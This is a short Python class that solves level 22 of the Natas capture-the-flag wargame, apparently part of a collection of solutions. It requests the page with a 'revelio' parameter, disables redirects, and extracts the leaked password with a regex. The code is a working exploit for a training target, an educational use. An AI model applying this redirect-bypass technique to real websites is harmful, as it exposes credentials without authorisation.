import re
from src.natas.base_level import NatasLevel

class Level_22(NatasLevel):

  num = 22
  explanation = "On this level, the page redirects non-admin users, but the password is printed before the `Location` header.\n     We disable automatic redirects to capture the response containing the password."

  def exploit(self) -> str:

    resp  = self.session.get(self.base_url, params = {"revelio": ""}, allow_redirects = False)
    match = re.search(r'Password: (.*)[a-zA-z0-9]', resp.text, re.MULTILINE).group().replace("Password:", "").replace("</pre", "").strip()

    return match
